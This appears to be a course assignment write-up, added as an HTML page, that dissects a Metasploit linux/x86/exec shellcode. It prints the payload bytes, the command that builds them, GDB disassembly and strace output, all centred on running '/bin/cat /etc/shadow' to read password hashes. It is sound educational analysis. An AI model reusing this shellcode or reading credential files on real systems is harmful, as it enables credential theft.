@@ -1,0 +1,184 @@
+<h4>Assignment #5.1</h4>
+<p>
+	For Assignment 5.1 I have selected the simple exec() payload which will
+	attempt to execute /bin/cat /etc/shadow. This payload has
+	been generated for C with the following command and output:
+</p>
+<pre class="prettyprint linenums">
+$ msfpayload linux/x86/exec CMD="/bin/cat /etc/shadow" C
+/*
+ * linux/x86/exec - 56 bytes
+ * http://www.metasploit.com
+ * VERBOSE=false, PrependSetresuid=false, 
+ * PrependSetreuid=false, PrependSetuid=false, 
+ * PrependSetresgid=false, PrependSetregid=false, 
+ * PrependSetgid=false, PrependChrootBreak=false, 
+ * AppendExit=false, CMD=/bin/cat /etc/shadow
+ */
+unsigned char buf[] = 
+"\x6a\x0b\x58\x99\x52\x66\x68\x2d\x63\x89\xe7\x68\x2f\x73\x68"
+"\x00\x68\x2f\x62\x69\x6e\x89\xe3\x52\xe8\x15\x00\x00\x00\x2f"
+"\x62\x69\x6e\x2f\x63\x61\x74\x20\x2f\x65\x74\x63\x2f\x73\x68"
+"\x61\x64\x6f\x77\x00\x57\x53\x89\xe1\xcd\x80";
+$
+</pre>
+<p>
+	To begin I have loaded this code into the shellcode.c
+	program for testing and compiled the code with:
+</p>
+<pre class="prettyprint linenums">
+gcc -ggdb -z execstack -fno-stack-protector shellcode.c -o sc
+</pre>
+<p>
+	Starting in GDB, I have placed a breakpoint on the
+	call to eax that is shown in disassemble main
+	and have done a single stepi to enter the call.
+</p>
+<p>
+	The following is what GDB thinks will happen for the
+	next 27 instructions.
+</p>
+<pre class="prettyprint linenums">
+(gdb) x/27i $eip
+=> 0xb7fde000:	push   0xb
+   0xb7fde002:	pop    eax
+   0xb7fde003:	cdq    
+   0xb7fde004:	push   edx
+   0xb7fde005:	pushw  0x632d
+   0xb7fde009:	mov    edi,esp
+   0xb7fde00b:	push   0x68732f
+   0xb7fde010:	push   0x6e69622f
+   0xb7fde015:	mov    ebx,esp
+   0xb7fde017:	push   edx
+   0xb7fde018:	call   0xb7fde032
+   0xb7fde01d:	das    
+   0xb7fde01e:	bound  ebp,QWORD PTR [ecx+0x6e]
+   0xb7fde021:	das    
+   0xb7fde022:	arpl   WORD PTR [ecx+0x74],sp
+   0xb7fde025:	and    BYTE PTR [edi],ch
+   0xb7fde027:	gs
+   0xb7fde028:	je     0xb7fde08d
+   0xb7fde02a:	das    
+   0xb7fde02b:	jae    0xb7fde095
+   0xb7fde02d:	popa   
+   0xb7fde02e:	outs   dx,DWORD PTR fs:[esi]
+   0xb7fde030:	ja     0xb7fde032
+   0xb7fde032:	push   edi
+   0xb7fde033:	push   ebx
+   0xb7fde034:	mov    ecx,esp
+   0xb7fde036:	int    0x80
+(gdb)
+</pre>
+<p>
+	Rather than using the tools to make this so much easier I will
+	step through by hand in GDB to determine exactly what is happening
+	with this shellcode.
+</p>
+<p>
+	The following starts us off by clearing up the registers
+	and setting our first EAX value to 0xb ( decimal 11 ) which is
+	execve() as defined in /usr/include/i386-linux-gnu/asm/unistd_32.h
+</p>
+<pre class="prettyprint">
+   0xb7fde000:  push   0xb
+   0xb7fde002:  pop    eax
+   0xb7fde003:  cdq
+</pre>
+<p>
+	Because we know that this first call is to execve() it is easy
+	to determine what the next few bytes are doing. Checking man 2 execve
+	shows that the execve function is defined as:
+</p>
+<pre class="prettyprint linenums">
+int execve(const char *filename, char *const argv[], char *const envp[]);
+</pre>
+<p>
+	The following code sets up the function arguments, I have added comments
+	at the end of each line to describe what is happening to the stack.
+</p>
+<pre class="prettyprint">
+   0xb7fde004:  push   edx		; Stack now contains a null
+   0xb7fde005:  pushw  0x632d		; (c-) -c in reverse
+   0xb7fde009:  mov    edi,esp		; EDI contains the address of -c
+   0xb7fde00b:  push   0x68732f		; (hs/) /sh in reverse
+   0xb7fde010:  push   0x6e69622f	; (nib/) /bin in reverse
+   0xb7fde015:  mov    ebx,esp		; EBX contains the address of /bin/sh -c
+					; EDI contains the address of -c
+   0xb7fde017:  push   edx		; Stack now contains another null
+</pre>
+<p>
+	At this point the important registers to note are:
+</p>
+<pre>
+EAX	0xb
+EBX	pointer to /bin/sh -c
+EDX	0x00
+EDI	pointer to -c
+</pre>
+<p>
+	The next chunk of code bypasses 0x1A bytes of code as a call
+	(from 0xe018 to 0xe032). We will look at this 26 bytes of code
+	in a moment.
+</p>
+<pre class="prettyprint">
+   0xb7fde018:  call   0xb7fde032
+...
+   0xb7fde032:  push   edi
+   0xb7fde033:  push   ebx
+   0xb7fde034:  mov    ecx,esp
+   0xb7fde036:  int    0x80
+</pre>
+<p>
+	The call has taken us almost to the end of the shellcode, we have pushed
+	a null onto the stack, now we push a pointer to -c, and then a pointer to
+	/bin/sh -c. This sounds a lot like envp, arguments, command requirements
+	for the execve() call. The final mov of ecx, esp sets up the execve() call
+	because EAX still contains 0xb, which is executed by the int 0x80
+</p>
+<p>
+	But how does execve() know what to execute beyond /bin/sh -c ? Right before
+	int 0x80 is called we have the following useful information in our registers
+</p>
+<pre>
+EAX	0xb
+EBX	pointer to /bin/sh -c
+ECX	pointer to stack of /bin/sh -c ???
+EDX	0x00 for ENVP
+</pre>
+<p>
+	The trick here is that ECX points at a stack. We know from a jmp, call, pop
+	method of finding offsets in our shellcode that a call will save the location
+	of what is underneath it to the stack (because otherwise the pop would be
+	useless). This means that the stack contains the command to run positioned
+	after (for execution purposes) the /bin/sh -c command.
+</p>
+<p>
+	Here are 24 hex bytes from our original C string, which are just after the
+	call (and thus in prime position to be the follow on to our ECX address):
+</p>
+<pre class="prettyprint">
+\x00\x00\x00			; Null
+\x2f\x62\x69\x6e		; /bin
+\x2f\x63\x61\x74		; /cat
+\x20				; Space
+\x2f\x65\x74\x63		; /etc
+\x2f\x73\x68\x61\x64\x6f\x77	; /shadow
+\x00				; Null
+</pre>
+<p>
+	Sure enough, this is the command we are trying to execute!
+</p>
+<p>
+	Here is the relevant line from strace ./sc
+</p>
+<pre class="prettyprint">
+execve("/bin/sh", ["/bin/sh", "-c", "/bin/cat /etc/shadow"], [/* 0 vars */]) = 0
+</pre>
+<p>
+	ndisasm is not useful here as its disassembly looks the same as the gdb
+	output. However, graphing the shellcode with libemu and sctest can make
+	it a lot easier to see what is going on. Here is the graph for the
+	msfpayload shellcode:
+</p>
+<img src="<?php echo base_url(); ?>/exam/slae-431-5.1.png" title="LibEMU output" />
+
